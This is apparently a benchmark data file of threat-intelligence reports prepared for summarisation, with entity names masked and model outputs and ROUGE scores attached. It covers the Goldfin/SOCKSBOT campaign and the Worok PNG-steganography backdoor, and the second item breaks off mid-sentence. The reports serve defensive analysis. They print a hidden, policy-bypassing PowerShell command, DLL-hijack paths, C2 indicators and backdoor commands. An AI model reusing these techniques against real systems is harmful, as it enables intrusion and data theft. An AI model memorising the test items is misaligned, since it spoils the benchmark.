[DATE] Exhibit 8 : [DATE] Obfuscated [DATE] Code in checkupdate.ps1The code is in fact a [ORG] PowerShell reflective loader script with a dynamic - link library ( [ORG] DLL ) binary embedded as Base64 - encoded data ( Exhibit 9).Copyright \u00a9 2018 Accenture Security . All rights reserved.9Exhibit 9 : Deobfuscated Code in checkupdate.ps1STAGE 4 - SOCKSBOTThe specific SOCKSBOT sample analyzed in this report has the following properties:\u2022 Filename : socksbot.dll \u2022 File Size : [CARDINAL] 17.0 [PERSON] KB ( [CARDINAL] 17408 bytes ) \u2022 Compiled Time Stamp : [CARDINAL] 2017 - [CARDINAL] 10 - 27 17:46:05Copyright \u00a9 2018 Accenture Security . All rights reserved.10As mentioned in the last section , the [ORG] SOCKSBOT implant is typically delivered as a Base64 - encoded string reflectively loaded ( via the ? ReflectiveLoader@@YGKPAX@Z exported function ) in a newlystarted svchost.exe process . As such , the implant exists only in memory and never touches the disk . The implant will [ORDINAL] first verify if any of the mutexes in the following format are present in order to not run twice : Global\\%snps Global\\%sstpExhibit [CARDINAL] 10 shows an example of a created mutex . Exhibit [CARDINAL] 10 : [ORG] Mutex [ORG] Creation a321c0d8979a05bdnpsThe SOCKSBOT implant has the following capabilities:\u2022 [PERSON] Enumerate processes ( process list ) \u2022 Take screenshots \u2022 Download , upload , write , and execute files \u2022 Create and inject into new processes \u2022 Communicate to C2 via socketsThis implant will communicate with the designated C2 server by [ORDINAL] first creating a buffer and will , on [ORDINAL] first execution , communicate to the C2 server that it has successfully infected a target by using a.php URI that is pseudo - randomly generated . SOCKSBOTuses the ObtainUserAgentString API to determine the default user - agent of the machine . An example of a request to the C2 46.166.163[.]243 is shown in Exhibit 11.Exhibit [CARDINAL] 11 : Traffic to the C2 ServerThe C2 server or the operator of the [ORG] SOCKSBOT implant can then respond with a specific HTTP status code to perform a set of actions . Exhibit [CARDINAL] 12 shows this option in the implant . Copyright \u00a9 2018 Accenture Security . All rights reserved.11Exhibit [CARDINAL] 12 : C2 OptionsThe following status codes are supported:\u2022 [CARDINAL] 200 : create and start new socket \u2022 [CARDINAL] 202 : enumerate processes and take screenshot \u2022 [CARDINAL] 203 : perform a set of actions ( download , upload , execute)Exhibit [CARDINAL] 13 shows an example of possible actions : Exhibit [CARDINAL] 13 : HTTP Status Code [CARDINAL] 203 Return OptionsThe actions that the operator can perform are as follows:\u2022 [PERSON] Write and execute filesCopyright \u00a9 2018 Accenture Security . All rights [ORG] reserved.12\u2022 [ORG] Execute [ORG] PowerShell scripts \u2022 Execute a [ORG] PowerShell script and [ORG] exitSOCKSBOT can thus write other [ORG] PowerShell scripts to the % TEMP% folder and execute these hidden from the user . This is achieved with the following command:%s\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy [PERSON] Bypas s -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File \" % s\"This allows the attacker to upload other obfuscated [ORG] PowerShell scripts on the machine [CARDINAL] 46.166.163[.]243 [CARDINAL] 5.135.73[.]113INFECTION [ORG] CHAIN VARIATIONSWhile the described infection chain above is the most common infection chain observed , [ORG] iDefense analysts have also observed a number of different variations in related campaigns:1 . [PERSON] SOCKSBOT [PERSON] Dropper [CARDINAL] 2 . dog.js Obfuscation [CARDINAL] 3 . Random PowerShell Script Names [CARDINAL] 4 . Reflective loading PowerShell Script ObfuscationVARIATION [CARDINAL] 1 : SOCKSBOT DROPPERAside from the [ORG] PowerShell reflective loader , [ORG] iDefense analysts have also identified a dropper executable binary with the following properties that was used to reflectively load SOCKSBOT into a chosen process ( usually svchost.exe):\u2022 Filename : < random > \u2022 File Size : [CARDINAL] 23.6 [PERSON] KB ( [DATE] 24200 bytes ) \u2022 Compiled Time Stamp : [DATE] 2017 - 02 - 01 13:40:14Copyright \u00a9 2018 Accenture Security . All rights reserved.13\u2022 Signer : [ORG] Magnum [ORG] Travel [ORG] Club ( Serial : [CARDINAL] 1F 8A 3E [CARDINAL] 60 EE C1 E3 AA [CARDINAL] 63 B3 9B DD 26E1 10 FB)Note that the binary was signed with a code - signing certificate purportedly from an organization called [ORG] Magnum [ORG] Travel [ORG] Club . This dropper will create a copy of itself in C:\\Programdata\\Logs as a hidden system file and will then delete the original file . Another copy will be created in % appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup with the same properties to ensure persistence . Finally , the dropper will start a new svchost.exe process in a suspended state andconsequently reflectively load ( and inject ) the [ORG] SOCKSBOT implant into the process . An additional Windows service may be created for persistence as well , which is done by [ORDINAL] first enumerating existing legitimate services and creating a new service spoofing one of the services with an almost identical name . In this case , a new service named [ORG] Xindows [ORG] Error [ORG] Reporting [ORG] Service was created ( seeExhibit 14).Exhibit 14 : Service [ORG] CreationWhile this dropper does indeed load the [ORG] SOCKSBOT implant , all other iterations or campaigns have used scripts , in particular [ORG] JavaScript and [ORG] PowerShell , to reflectively load the [ORG] SOCKSBOT payload . VARIATION [CARDINAL] 2 : DOG.JS OBFUSCATIONWhile most dog.js samples observed were obfuscated as reported in the infection chain section , there are also versions that were not obfuscated at all or were obfuscated using a different obfuscation technique such as different character encoding ( Exhibit 15):Copyright \u00a9 2018 Accenture Security . All rights reserved.14Exhibit [CARDINAL] 15 : A Different Obfuscation Technique Used in dog.js and generate a new file called ~~1.tmp in % appdata%\\Futures . The script is deleted after execution . VARIATION [CARDINAL] 3 : RANDOM POWERSHELL SCRIPT NAMESCertain variants of dog.js also have a new function to randomly generate file names for [DATE] the [DATE] second- [DATE] and [ORDINAL] third - stage [ORG] PowerShell scripts : function makerndps1 ( ) { var text = \" \" ; var possible = \" ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz 0123456789 \" ; for ( var i = [CARDINAL] 0 ; i < [CARDINAL] 5 ; i++ ) text + = possible.charAt(Math.floor(Math.random ( ) * [GPE] possible.l ength ) ) ; return text + ' .ps1 ' ; } [CARDINAL] 4 . REFLECTIVE LOADING POWERSHELL SCRIPT OBFUSCATIONAside from changes to the dog.js obfuscation , [ORG] iDefense analysts have also found a different obfuscation technique used to obscure the code in the reflective loading script ( see Exhibit 16):Copyright \u00a9 2018 Accenture Security . All rights reserved.15Exhibit [CARDINAL] 16 : Different Obfuscation Technique Used in [WORK_OF_ART] the [WORK_OF_ART] Reflective [WORK_OF_ART] Loading [WORK_OF_ART] PowerShell also that the execution command used for persistence is again encoded ( see Exhibit 17):Exhibit 17 : Obfuscated Execution Command in [GPE] Check for update Service Used for PersistenceATTRIBUTIONBased on the preference to spoof financial institutions in [ORG] CIS countries , the network infrastructure used and the observed targeting , [ORG] iDefense assesses with moderate confidence that the reported campaign is unlikely to be associated with [PERSON] CANDLEFISH.Furthermore , [ORG] iDefense analysts have identified a number of interesting and noteworthy overlaps with FIN7:\u2022Identical [ORG] WHOIS information used in domains associated with the Goldfin campaign and FIN7 , as well as network hosting overlap\u2022 Shared use of a [ORG] PowerShell obfuscation techniqueCopyright \u00a9 2018 Accenture Security . All rights reserved.16OVERLAP [CARDINAL] 1 : IDENTICAL WHOIS INFORMATION AND [ORG] NETWORK HOSTING OVERLAPResearch shows that the domains privat - bankau[.]com , halyk - bank[.]com , and tejara- [ORG] bank[.]com all have the organization name [PERSON] Goldfin [PERSON] LLC , a near - identical registrantaddress ( see below ) , and a @rambler.ru e - mail address used as the registrant e - mail address . [ORG] Registrant Organization : [ORG] Goldfin [ORG] LLC [ORG] Registrant [ORG] Street : ul Arbat 5 Registrant City : [GPE] Moscow [GPE] Registrant State / Province : [GPE] Moscow Registrant Postal Code : 115343 Registrant Country : RUThis pattern overlaps with [CARDINAL] two other domains - despanabrandfood[.]com and [NORP] silverdiners[.]com ( see Exhibit 18 ) - that [ORG] iDefense current assesses with low confidence are likely associated with FIN7 due to the following:1 . Spoofing restaurant chains [ORG] Despa\u00f1a [ORG] Brand [ORG] Foods ( legitimate domain despanabrandfoods.com ) and [PERSON] Silver [PERSON] Diner ( legitimate domain silverdiners.com ) , a known technique associated with FIN7 . The website [ORG] despanabrandfood[.]com remains indexed by Google ( see Exhibit 19)2 . Previously resolved to the [ORG] IP address 192.99.14[.]211 , which was reported byTrustwave and tr1dx as associated with FIN7 towards [DATE] late [DATE] 2016 and [DATE] early [DATE] 2017 . In addition , like many domains associated with FIN7 as well as the [GPE] Carbanak group , many of the domains used in the Goldfin campaign were also parked at 31.41.41[.]41 which is associated with [ORG] CIS [ORG] Hosting . However , [ORG] iDefense analysts are aware both hosts are likely to be shared / parking hosts hence the association with FIN7 based on this overlap is of low confidence . Exhibit [CARDINAL] 18 : [ORG] WHOIS [ORG] Information [ORG] Similarities between [ORG] Domains Used in [GPE] the [GPE] Goldfin [GPE] Campaign and Those Associated with FIN7Copyright \u00a9 2018 Accenture Security . All rights reserved.17Exhibit [CARDINAL] 19 : Spoofing domain [ORG] despanabrandfood[.]com remains indexed by Google at the time of writing , showing the attacker \u2019s intention to plagiarise the legitimate website despanabrandfoods[.]comExhibit [CARDINAL] 20 illustrates the overlapping infrastructure between the Goldfin campaign and infrastructure associated with FIN7 : Exhibit [CARDINAL] 20 : Maltego Graph Showing the Overlapping Infrastructure between [PERSON] Goldfin [PERSON] Campaign and FIN7Copyright \u00a9 2018 Accenture Security . All rights reserved.18OVERLAP [CARDINAL] 2 : SHARED USE OF A POWERSHELL OBFUSCATION TECHNIQUEAs mentioned in the infection chain analysis , the code embedded within the [ORDINAL] third - stage [ORG] PowerShell script [ORG] checkupdate.ps1 is obfuscated using a technique similar to that of [ORG] PowerSploit . However , the technique used appears to be a niche variant as the embedded payload is further split into chunks and dynamically added to an array variable Interestingly , [ORG] iDefense analysts have previously observed this obfuscation used in a HALFBAKED is a malware family associated with FIN7.Exhibit [CARDINAL] 21 : Similar PowerShell Obfuscation Technique Used between [ORG] the [ORG] Goldfin [ORG] Campaign and FIN7While the above overlapping features are not strong enough to be used to conclude that the Goldfin campaign is associated with FIN7 , [ORG] iDefense analysts believe they are significant and noteworthy and may well add to new evidence that may come to light in the future as research continues . They also highlight the complex hidden relationships that exist behind - the - scenes in organized cyber crime . MITIGATIONTo effectively defend against the threats described in this report , [ORG] iDefense recommends blocking the following access URIs and [ORG] IP address : blopsadmvdrl[.]com tejara - bank[.]com privat - bankau[.]comCopyright \u00a9 2018 Accenture Security . All rights reserved.19halyk - bank[.]com wedogreatpurchases[.]com privatbank - ua[.]com moneyma - r[.]com micro - earth[.]com 5.8.88[.]64 46.166.163[.]243 [ORG] 5.135.73[.]113It will also be useful for incident response and threat - hunting purposes to verify the existence of any of the following artefacts:\u2022 A randomly named filein C:\\Programdata\\Logs or % appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\u2022 Randomly named [ORG] PowerShell or [ORG] JavaScript files in % temp% \u2022 A file named dog.zip and dog.js \u2022 A file named ~~1.tmp in % appdata%\\Futures \u2022 A service name with significant spelling errors \u2022 A service named Check for updates joshua.a.ray@accenture.comHoward [PERSON] Marshall howard.marshall@accenture.comRobert [PERSON] Coderre [PERSON] robert.c.coderre@accenture.comJayson [PERSON] Jean [PERSON] jayson.jean@accenture.comEmily Cody emily.a.cody@accenture.comCopyright \u00a9 2018 Accenture Security . All rights reserved.21ABOUT [ORG] ACCENTUREAccenture is a leading global professional services company , providing a broad range of services and solutions in strategy , consulting , digital , technology and operations . Combining unmatched experience and specialized skills across [CARDINAL] more [CARDINAL] than [CARDINAL] 40 industries and all business functions \u2014 underpinned by the world \u2019s largest delivery network \u2014 Accenture works at the intersection of business and technology to help clients improve their performance and create sustainable value for their stakeholders . With [CARDINAL] approximately [CARDINAL] 425,000 people serving clients in [CARDINAL] more [CARDINAL] than [CARDINAL] 120 countries , Accenture drives innovation to improve the way the world works and lives . Visit us at www.accenture.comABOUT [ORG] ACCENTURE SECURITYAccenture Security helps organizations build resilience from the inside out , so they can confidently focus on innovation and growth . Leveraging its global network of cybersecurity labs , deep industry understanding across client value chains and services that span the security lifecycle , [ORG] Accenture protects organization \u2019s valuable assets , end - to - end . With services that include strategy and risk management , cyber defense , digital identity , application security and managed security , Accenture enables businesses around the world to defend against known sophisticated threats , and the unknown . Follow us @AccentureSecure on [PERSON] Twitter or visit the Accenture Security blog . [ORG] LEGAL [ORG] NOTICE [ORG] & [ORG] DISCLAIMER : \u00a9 2018 Accenture . All rights reserved . Accenture , the [ORG] Accenture logo , [ORG] iDefense and other trademarks , service marks , and designs are registered or unregistered trademarks of [ORG] Accenture and its subsidiaries in [GPE] the [GPE] United [GPE] States and in foreign countries . All trademarks are properties of their respective owners . All materials are intended for the original recipient only . The reproduction and distribution of this material is forbidden without express written permission from [ORG] iDefense . The opinions , statements , and assessments in this report are solely those of the individual author(s ) and do not constitute legal advice , nor do they necessarily reflect the views of [ORG] Accenture , its subsidiaries , or affiliates . Given the inherent nature of threat intelligence , the content contained in this alert is based on information gathered and understood at the time of its creation . It is subject to change . [ORG] ACCENTURE PROVIDES THE INFORMATION ON AN \u201c AS - IS \u201d BASIS WITHOUT REPRESENTATION OR [ORG] WARRANTY [ORG] AND [ORG] ACCEPTS [ORG] NO [ORG] LIABILITY [ORG] FOR [ORG] ANY [ORG] ACTION [ORG] OR [ORG] FAILURE [ORG] TO [ORG] ACT [ORG] TAKEN IN RESPONSE TO THE INFORMATION CONTAINED OR REFERENCED IN THIS [ORG] ALERT .", "generated_text": "spear-phishing campaigns; SOCKSBOT; the use; Goldfin; financial institutions; CIS countries; early February 2017; May 2018; infrastructure overlap; PowerShell; FIN7; infrastructure overlap; infrastructure overlap; infrastructure overlap; infrastructure overlap; infrastructure overlap; the shared use; PowerShell obfuscation; FIN7; the Goldfin campaign; obfuscation; attribution; infrastructure discovery; response; tools; management; control; systems; infrastructure overlap; infrastructure; infrastructure overlap; infrastructure overlap; indicators; compromise; mitigation.", "ref_text": "<START-1>The document discusses a campaign dubbed Goldfin that has been active since February 2017 targeting financial institutions in Commonwealth of Independent States countries with spearphishing emails containing malware. The emails spoof legitimate banks and contain links to download an archive containing malicious JavaScript that ultimately delivers a malware implant called SOCKSBOT to compromised systems. SOCKSBOT is a backdoor capable of keylogging, screen capturing, downloading files, and arbitrary code execution. The malware uses various stages of obfuscated JavaScript and PowerShell scripts to eventually reflectively load SOCKSBOT into memory without writing files to disk. While some security vendors attribute the activity to APT CANDLEFISH, analysis of tactics, techniques, and procedures lead the researchers to assess with moderate confidence Goldfin is a distinct threat group not likely associated with CANDLEFISH. Noteworthy infrastructure and code overlaps are observed between Goldfin and FIN7, including shared domain WHOIS information, hosting IP addresses, and uncommon PowerShell obfuscation methods. While not enough to attribute Goldfin to FIN7, it reveals complex relationships in cybercrime. In total, the Goldfin campaign demonstrates a sophisticated, stealthy, and persistent threat targeting CIS financial organizations over an extended period for cyber espionage and financial gain. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5042016806722689, "gpt3/lexical/rouge_rouge2": 0.14084507042253522, "gpt3/lexical/rouge_rougeL": 0.24649859943977595, "gpt3/lexical/rouge_rougeLsum": 0.24649859943977595, "gpt3_generated_text": ["The article discusses a persistent campaign targeting financial institutions in the Commonwealth of Independent States (CIS) countries. The campaign, dubbed Goldfin, has been active since early February 2017 and continued until May 2018. The attackers used a malware family called SOCKSBOT to spoof financial institutions and carry out spear-phishing campaigns. The report highlights that the Goldfin campaign is unlikely to be associated with the CANDLEFISH threat group. However, there are infrastructure overlaps and the shared use of a PowerShell obfuscation technique with the FIN7 group, which indicates complex relationships in organized cybercrime. The report provides information for security operations center (SOC) analysts and engineers to detect and mitigate the threat, including detailed information about the malware family and indicators of compromise (IoCs). It also suggests that management and executive leadership can use this information to assess risks and make operational and policy decisions. Overall, the report aims to help address the existing or potential threats posed by this highly active threat group targeting financial institutions."]}, {"split_name": "test", "sample_id": "test_76", "prompt_text": "Extract the keywords: decoded.avast.io /martinchlumecky / png - steganography/ [ORG] PNG Steganography Hides Backdoor \u22ee [CARDINAL] 11/10/2022by Threat Intelligence TeamOur fellow researchers from [ORG] ESET published an article about previously undocumented tools infiltrating high - profile companies and local governments in [LOC] Asia . The tools , active since [DATE] at [DATE] least [DATE] 2020 are designed to steal data . ESET dubbed them Worok . ESET monitored a significant break in activity from [DATE] May [DATE] 5 , [DATE] 2021 to [DATE] the [DATE] beginning [DATE] of [DATE] 2022 . Nevertheless , when Worok became active again , new targeted victims \u2013 including energy companies in [LOC] Central [LOC] Asia and public sector entities in [LOC] Southeast [LOC] Asia \u2013 were infected to steal data based on the types of the attacked companies . The researchers from ESET described [CARDINAL] two execution chains and how victims \u2019 computers are compromised . The initial compromise is unknown , but the next stages are described in detail , including describing how the final payload is loaded and extracted via steganography from [ORG] PNG files . However , the final payload has not been recovered yet . Detailed information about [ORG] Worok , chains , and backdoor commands can be found in the ESET \u2019s article Worok : The big picture . Our analysis aims to extend the current knowledge of [ORG] ESET research . We have captured additional artifacts related to Worok at the end of the execution chain . The [ORG] PNG files captured by our telemetry confirm that the purpose of the final payload embedded in these is data stealing . What is noteworthy is data collection from victims \u2019 machines using [ORG] DropBox repository , as well as attackers using [ORG] DropBox API for communication with the final stage . [PERSON] Compromise [PERSON] ChainWe intend to remain consistent with the terminology set by ESET \u2019s research . Our research also has not discovered the whole initial compromise of the malware . However , we have a few new observations that can be part of an infiltrating process . Figure [CARDINAL] 1 illustrates the original compromise chain described by ESET . In some cases , the malware is supposedly deployed by attackers via [ORG] ProxyShell vulnerabilities . In some corner cases , exploits against the [ORG] ProxyShell vulnerabilities were used for persistence in the victim \u2019s network . The attackers then used publicly available exploit tools to deploy their custom malicious kits . So , the final compromise chain is straightforward : the [ORDINAL] first stage is [DATE] CLRLoader which implements a simple code that loads the next stage ( [ORG] PNGLoader ) , as reported by ESET.Figure [CARDINAL] 1 . Worok compromise chainInitial [PERSON] CompromiseThe specific initial attack vector is still unknown , but we found [CARDINAL] four DLLs in compromised machines containing the code of [ORG] CLRLoader . Our detections captured a process tree illustrated in Figure [DATE] 2.1/14Figure [DATE] 2 . Process tree running CLRLoaderThis process tree was observed for [GPE] WLBSCTRL.DLL , TSMSISrv . [ORG] DLL , and TSVIPSrv . [ORG] DLL . The mutual process that executes the DLLs is svchost -k netsvcs . Therefore , the initial process is [NORP] SvcHost introducing a Windows service . The [ORG] DLL files help us to identify [CARDINAL] two Windows services , namely [ORG] IKE and AuthIP [PERSON] IPsec [PERSON] Keying [PERSON] Modules ( [PERSON] IKEEXT ) and [ORG] Remote [ORG] Desktop [ORG] Configuration ( [ORG] SessionEnv ) . Both services are known for their [ORG] DLL hijacking of [ORG] DLL files missing in the System32 folder by default , [ORG] SCM and [ORG] DLL [ORG] Hijacking [ORG] Primer . Lateral movementThe [ORG] DLL hijacking in the System32 folder is not a vulnerability by itself because the attackers need administrator privileges to write into it . However , we assume the existence of an implemented reverse shell with administrator privileges as a consequence of the initial compromise . In that case , the attacker can efficiently perform the lateral movement via Service Control Manager ( SVCCTL).In short , the attackers place the hijacked [ORG] DLL files into % SYSTEMROOT%\\System32 and then start an appropriate service remotely . List of abused Windows services and their [ORG] DLL files : [ORG] IKE and AuthIP [PERSON] IPsec [PERSON] Keying ModulesC:\\Windows\\System32\\WLBSCTRL.dllRemote Desktop ConfigurationC:\\Windows\\System32\\TSMSISrv.dll C:\\Windows\\System32\\TSVIPSrv.dllThe [ORDINAL] second observed [ORG] DLL hijacked is related to [ORG] VMware machines . The attackers can misuse the hijacking of vmGuestLib.dll , which is used by the WMI Performance Adapter ( WmiApSrv ) service to provide performance information . On system start , [PERSON] WmiApSrv loads vmStatsProvider.dll , which tries to call vmGuestLib.dll from % ProgramFiles%\\VMware\\VMware Tools\\vmStatsProvider\\win32 as the [ORDINAL] first one . However , the original library is located at % SYSTEMROOT%\\System32 . Hence , if the attackers place vmGuestLib.dll into the % ProgramFiles% location , it also leads to [ORG] DLL hijacking . These [CARDINAL] two approaches are probable scenarios of how [NORP] CLRLoader can be executed , and the compromise chain shown in Figure [CARDINAL] 1 launched . The elegance of this approach is that attackers do not have to create a new service that may reveal suspicious activities . The attackers abuse only export functions of hijacked DLLs , whose empty reimplementation does not cause an error or any other indicator of compromise . Moreover , the persistence of [ORG] CLRLoader is ensured by the legitim Windows services . [ORG] CLRLoader [ORG] CLRLoader is a [ORG] DLL file written in [LOC] Microsoft [LOC] Visual [LOC] C++ . It implements the [ORG] DllMain method , which is responsible for loading the next stage ( .NET variant of [ORG] PNGLoader ) . The rest of the exported functions correspond to the interfaces of the hijacked DLLs , but the implementation of the export functions is empty . So , invoking this function does not cause a crash in the calling processes . Just for completeness , the hijacked files also contain digital signatures of the original [ORG] DLL files ; naturally , the signature is invalid . [ORG] CLRLoader is activated by calling LoadLibraryExW from an abused process / service . LoadLibraryExW is called with [CARDINAL] zero dwFlags parameters , so the [ORG] DllMain is invoked when the malicious [ORG] DLL is loaded into the virtual address space . An example of the CLRLoader code can be seen in Figure [DATE] 3.2/14Figure [DATE] 3 . DllMain of hijacked [NORP] DLLCLRLoader checks the presence of the .NET [ORG] DLL file containing [ORG] PNGLoader , creates a mutex , and finally executes [NORP] PNGLoader via CorBindToRuntimeEx API.We recognized [CARDINAL] two variants of [ORG] PNGLoader with the entry points as follow : Jsprofile . [PERSON] Jspfilter ( Setfilter ) pngpcd . ImageCoder ( PngCoder)PNGLoader The [ORDINAL] second stage ( [ORG] PNGLoader ) is loaded by [ORG] CLRLoader or , as reported by [ORG] ESET , by PowHeartBeat . We do not see any code deploying [ORG] PNGLoader on infiltrated systems yet , but we expect to see it in a similar manner as the lateral movement . [ORG] PNGLoader is a loader that extracts bytes from PNGs files and reconstructs them into an executable code . [ORG] PNGLoader is a .NET [ORG] DLL file obfuscated utilizing .NET Reactor ; the file description provides information that mimics legitimate software such as [PERSON] Jscript [PERSON] Profiler or [ORG] Transfer [ORG] Service [ORG] Proxy . The deobfuscated [ORG] PNGLoader code includes the entry point ( Setfilter ) invoked by [NORP] CLRLoader . There is a hardcoded path loader_path that is searched for all [ORG] PNG files recursively . Each .png file is verified to the specific bitmap attributes ( height , width ) and steganographically embedded content ( [ORG] DecodePng ) . The [PERSON] Setfilter method is shown in Figure [CARDINAL] 4.Figure [CARDINAL] 4 . The [PERSON] Setfilter method of PNGLoaderThe steganographic embedding relies on [CARDINAL] one of the more common steganographic techniques called least - significant bit ( LSB ) encoding . In general , this method embeds the data in the least - significant bits of every pixel . In this specific implementation , [CARDINAL] one pixel encodes a nibble ( one bit per each alpha , red , green , and blue channel ) , i.e. [CARDINAL] two pixels3/14contain a byte of hidden information , as illustrated in Figure [CARDINAL] 5 . While this method is very easy to detect by a simple statistical analysis , such change in pixel value is hardly perceivable by the naked eye . Figure [CARDINAL] 5 . [PERSON] Byte reconstruction from [CARDINAL] 2 pixelsThe steganographically embedded content is then extracted in [CARDINAL] four steps as follows . The [ORDINAL] first [CARDINAL] 16 bytes ( [CARDINAL] 32 pixels ) of the [ORG] PNG file are extracted , and the [ORDINAL] first 8 bytes must match a magic number . This check is performed due to the computational complexity necessary to pull the rest of the pixels ( approx . [CARDINAL] hundreds [CARDINAL] of [CARDINAL] thousands of pixels ) . The following [CARDINAL] 8 bytes then represent the length of the embedded payload . The following extracted data is an encrypted payload in [GPE] Gzip format . The extracted payload is decrypted using a multiple - byte XOR hard - coded in [ORG] PNGLoader . The result of [ORG] XORing is [GPE] Gzip data that is un - gzipped . The result of these steps is the final payload steganographically embedded in the [ORG] PNG file . Steganographically Embedded PayloadIf PNGLoader successfully processes ( extract \u2192 decode \u2192 unpack ) the final payload , it is compiled in runtime and executed immediately . Our telemetry has picked up [CARDINAL] two variants of [ORG] PNGLoader working with the magic numbers recorded in Figure [CARDINAL] 6.Figure [CARDINAL] 6 . Data structure embedded in [ORG] PNG bitmapThe [ORDINAL] first payload implementation is a [ORG] PowerShell script , as demonstrated by the code fragment of [ORG] PNGLoader in Figure [CARDINAL] 7 . Like our [ORG] ESET colleagues , we have no sample of this payload yet , but we expect a similar function as the [ORDINAL] second payload implementation described below . Figure [CARDINAL] 7 . Code fragment of [ORG] PNGLoader executing the [ORG] PowerShell payloadThe [ORDINAL] second payload implementation is .NET C # compiled and executed via the [ORG] CompileAssemblyFromSource method of the [PRODUCT] CSharpCodeProvider class , see Figure [TIME] 8.4/14Figure [TIME] 8 . Execution of C # payload embedded in [ORG] PNG bitmapThe .NET C # payload has a namespace [PERSON] Mydropbox , class [ORG] Program , and method [ORG] Main . The namespace indicates that the payload operates with [ORG] DropBox . Our telemetry captured a few [ORG] PNG files , including the steganographically embedded C # payload . [ORG] PNG [PRODUCT] FilesAt [ORDINAL] first glance , the [ORG] PNG pictures look innocent , like a fluffy cloud ; see Figure [CARDINAL] 9 . Our telemetry has captured [CARDINAL] three [ORG] PNG pictures with the following attributes : Size : [CARDINAL] 1213 x [CARDINAL] 270 ( px ) Bit Depth : [CARDINAL] 8 , Color Type : [CARDINAL] 6 ( RGB + Alpha)Figure 9 . Malicious [ORG] PNG file with steganographically embedded C # payloadAs we mentioned before , malware authors rely on [ORG] LSB encoding to hide malicious payload in the [ORG] PNG pixel data , more specifically in LSB of each color channel ( Red , Green , [ORG] Blue , and [GPE] Alpha ) . Let us have a look at their bit - planes . Figure 10shows one of the higher bit planes for each color channel ; notice that each of these images looks far from random noise . If we had a look at an image without data embedded in its [ORG] LSB , we would usually see similar patterns.5/14Figure [CARDINAL] 10 . [CARDINAL] One of the [ORG] RGB bit - planes without hidden dataNow , to put it into contrast , let us have a look at [ORG] LSB bit - planes . Figure [CARDINAL] 11 shows [ORG] LSB bit - planes for every channel of the [ORG] PNG image with the embedded encrypted ( and compressed ) payload . Recall that both encryption and compression should usually increase the entropy of the image . Therefore , it should be no surprise that [ORG] LSB bit - planes of such an image look like random noise . It is evident that the whole canvas of [ORG] LSB bit - planes is not used . Figure [CARDINAL] 11 . [CARDINAL] Zero ( [ORG] LSB ) bit - plains channels with embedded dataThe payload occupies only pixels representing the payload size , and the rest are untouched ; see the algorithm below.6/14In this specific case , the [ORG] PNG files are located in C:\\Program Files\\Internet Explorer , so the picture does not attract attention because Internet [ORG] Explorer has a similar theme as Figure [CARDINAL] 12 shows . Figure [CARDINAL] 12 . Example of graphic Internet [ORG] Explorer themeDropBoxControl At this time , we can extend the ESET compromise chain by the .NET C # payload that we call DropBoxControl \u2013 the [ORDINAL] third stage , see Figure [DATE] 13.7/14Figure [DATE] 13 . Extended compromise chainDropBoxControl is a backdoor that communicates with the attackers via the [ORG] DropBox service . [ORG] Noteworthy , the [ORG] C&C server is a [ORG] DropBox account , and whole communications , such as commands , uploads , and downloads , are performed using regular files in specific folders . Therefore , the backdoor commands are represented as files with a defined extension . DropBoxControl periodically checks the [ORG] DropBox folder and executes commands based on the request files . The response for each command is also uploaded to the [ORG] DropBox folder as the result file . The text below describes the individual DropBoxControl components and the whole backdoor workflow . [ORG] DropBox APIDropBoxControl implements the [ORG] DropBox communication by applying the standard API via HTTP / POST . There is a dedicated class , DropBoxOperation , wrapping the API with the method summarized in [LAW] Table [LAW] 1 . A [ORG] DropBox API key , sent in the HTTP header , is hard - coded in the DropBoxControl sample but can be remotely changed . DropBoxControl Method API Table 1 . DropBox API implemented by DropBoxControlurl url url url attackers control the backdoor through [CARDINAL] ten commands recorded in [LAW] Table [LAW] 2.Run cmd /c < param [ORG] > [ORG] & exit , the param is sent by the attackers . Execute a defined executable with specific parameters . Download data from the [ORG] DropBox to a victim \u2019s machine . Command Description FileDownload Upload data from a victim \u2019s machine to the [ORG] DropBox . [ORG] FileDelete [ORG] FileRename [ORG] Rename data from a victim \u2019s machine . Table 2 . Backdoor commandsDelete data from a victim \u2019s machine . Sent file information ( name , size , attributes , access time ) about all victim \u2019s files in a defined directory [PERSON] Set a current directory for the backdoor [PRODUCT] Send information about a victim \u2019s machine to [ORG] the [ORG] DropBox [ORG] Update a backdoor configuration file ; see [PERSON] ConfigurationThe [PERSON] Info command sends basic information about an infiltrated system as follows : ClientId hard - coded in each DropBoxControl sample Hostname of a victim \u2019s machine [PERSON] List of all victim \u2019s IPs Version and file size of explorer.exe Windows architecture [PERSON] List of hard drivers , including total size , available free space , and drive type The current time of victim \u2019s [ORG] machineConfiguration8/14DropBoxControl , the object of this study , uses [CARDINAL] three files located on C:\\Program Files\\Internet Explorer . The file names try to look legitimate from the perspective of the Internet Explorer folder.ieproxy.datThis file contains the DropBoxControl configuration that is encrypted . It configures [CARDINAL] four variables as follows : [PERSON] DropboxId : API key used for authorization Interval : how often the [ORG] DropBox disk is checked UpTime / DownTime : defines the time interval when the backdoor is active ( seen [CARDINAL] 7 \u2013 [CARDINAL] 23)See the example of the configuration file content : [ORG] Bearer WGG0iGT****AAGkOdrimId9***QfzuwM - nJm***R8nNhy,300,7,23iexplore.logThe iexplore.log file is a log file of DropBoxControl which records most actions like contacting the [ORG] DropBox , downloading / uploading files , configuration loading , etc . Log entities are logged only if a sqmapi.dat file exists . The login engine is curiously implemented since the log file is not encrypted and contains decrypted data of the ieproxy.dat file . EncryptionDropBoxControl encrypts the configuration file ( actually without effect ) , and the [ORG] DropBox communication . The config file is encrypted using multi - byte XOR with a hard - coded key ( owe01zU4 ) . Although the API communication is encrypted via [ORG] HTTPS , data stored on the [ORG] DropBox is encrypted by its own algorithm . The data is encrypted using another hard - coded byte array ( hexEnc ) , TaskId , and [ORG] ClientId . Moreover , TaskId is used as an index to the hexEnc array , and the index is salted with [ORG] ClientId in each iteration ; see Figure [CARDINAL] 14 . It is similar to the algorithm used by PowHeartBeat , as described in the ESET report . Figure [CARDINAL] 14 . Encryption algorithm used for [ORG] DropBox filesDropBox [ORG] FilesAs we mentioned above , the communication between the backdoors and the attackers is performed using the [ORG] DropBox files . In general , [ORG] DropBox files that contain valuable information are encrypted . Each file , in addition to the data itself , also includes 